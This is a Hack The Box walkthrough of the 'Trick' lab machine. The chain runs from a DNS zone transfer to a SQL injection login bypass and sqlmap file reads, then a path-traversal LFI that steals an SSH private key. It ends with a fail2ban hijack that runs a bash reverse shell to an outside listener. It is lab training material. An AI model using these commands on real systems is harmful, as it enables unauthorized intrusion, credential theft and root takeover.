# HTB - Trick 

## Summary

This was a fun box. The web exploitation involves using a DNS Zone Transfer to find a subdomain. From that subdomain, we can do a sql injection to find another subdomain. This second subdomain is vulnerable to a LFI, which enables us to pull back a user's private ssh key. The privlege escalation involves changing a ssh banning script which runs as root to execute a reverse shell as root.

## DNS Reverse Lookup

A forward DNS lookup is when you query the DNS server for an ip address by giving it a hostname  
A reverse DNS lookup is when you query the DNS server for a hostname given an ip address  
We can do this with nslookup:  
`nslookup`  
`> server 10.10.11.166`  
10.10.11.166 is the ip address of the target box. We saw it was running a dns server on port tcp/53  
`> 10.10.11.166`

The result of this is the hostname of the server trick.htb  
**Note:** Remember our nmap scan only scans tcp ports by default. So, although we can only see tcp/53 open, udp/53 is also likely open  
DNS uses TCP port 53 for zone transfers, for maintaining coherence between the DNS database and the server  
UDP port 53 is used when a client sends a query to the DNS server  

We can also (and probably should) use `dig` to do the reverse lookup  
The @ is followed by the DNS server to use, the -x specifies we want to do a reverse lookup  
`dig @10.10.11.166 -x 10.10.11.166`  
This will give us a similar, but more detailed result than nslookup  

## DNS Zone Transfer

DNS zone transfer is a type of DNS transaction  
Its one of the many mechanisms available for administrators to replicate DNS databases across a set of DNS servers  
We can request a zone transfer from the DNS server using dig:  
`dig @ 10.10.11.166 axfr trick.htb` where trick.htb is the top level domain name  
The result, shows us that preprod-payroll.trick.htb is a CNAME record  
A CNAME, or Canonical Name record is a type of DNS record that maps an alias name to a true or canonical domain name
CNAME records are typically used to map a subdomain such as www or mail to the domain hosting that subdomains content  
So basically, we have found a subdomain  
We add trick.htb and preprod-payroll.trick.htb to our /etc/hosts file:  
`10.10.11.166 trick.htb preprod-payroll.trick.htb`  

## Web Exploitation

The login page at preprod-payroll.trick.htb is vulnerable to a very basic SQL Injection  
If we just type `admin' or 1=1-- -` in the Username field, we are able to login  

We will use SQLMap on the login HTTP request, to see what options we have  
To do this, intercept a legit login attempt (like admin/password) with BurpSuite, and send the request to a file login.req  
Then, `sqlmap -r login.req --batch`  
batch means don't ask for user input, just use the default option for all questions  

The result is a "time-based blind", which is not ideal because it means we will have to wait a long time to get any data  

We can instead run:  
`sqlmap -r login.req --batch --technique=BEU --risk 3 --level 5`  

B, E, and U all stand for something, T, which stands for time based is excluded in this case. `man sqlmap` to learn more. The default --technique value includes it. We also need to elevate the risk levels for it to find more types of attacks.  

With this new query, sqlmap finds a boolean-based blind and an error-based blind, which is better for us  

Now, we can run the same sqlmap command, but this time with the `--privilege` flag, to determine see what priviliges we can have  

We see we have the "FILE" privilege. This means we can read files off the filesystem  

From this, we can read the nginx configuration file with:  

`sqlmap -r login.req --batch --technique=BEU --risk 3 --level 5 --privilege --file-read=/etc/nginx/sites-enabled/default`  

From the file we get as a result, we can see there is another, previously unknown nginx site running, preprod-marketing.trick.htb  
We can add this to `/etc/hosts` now

Clicking around preprod-marketing, we see that there is LFI in the url. Ie: `index.php?page=services.html`  

After some trial and error in BurpSuite, we find that the needed syntax to get arbitrary LFI in this case is `....//....//....//`  

Using this, we can put:  
`index.php?page=....//....//....//home/michael/.ssh/id_rsa`  
in burp suite or in the browser, and get back michael's ssh key

We can copy the key to a file, making sure to include an extra newline at the end, chmod 600 the file, and then ssh -i to get ssh access as michael.  

## Privlege Escalation

Here is a nice trick:  
`find / -user michael 2>/dev/null | less`  
Then, when a ton of stuff comes up, and you get the colon, type &! to exclude things from the view. So you can exclude /var /sys /proc etc...  

Unfortunately, michael doesn't own any interesting files  

Using the `groups` command, we can see what groups michael is a part of. He is a part of the "security" group. We can rerun the find command with `-group` security to find the places that group has accesses  

From this, we find the `/etc/fail2ban/action.d` directory which contains a bunch of stuff  

Everything in the directory is owned by root, but because we have rwx on the directory, we can mv and delete files.  

First, create a reverse shell `/dev/shm/shell.sh` with the contents:
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.7/8686 0>&1
```
And test run it as michael with a netcat listener on 8686 to verify it works as michael.  
Now we can worry about getting root to execute this rev shell.  

We will do this by editing the "actionban" action in `iptables-multiport.conf` to call `/dev/shm/shell.sh` instead of its intended action, and then getting michael banned by failing a bunch of ssh logon attempts, to get the script to be called  

It ended up being a big pain to get the thing to ban me, had to download a tool called `crackmapexec` and run:  
`crackmapexec ssh trick.htb -u oxdf -p /usr/share/wordlists/fasttrack.txt`  
to get enough attempts instantly to get banned. Once I got banned, the root shell connected back to the nc listner
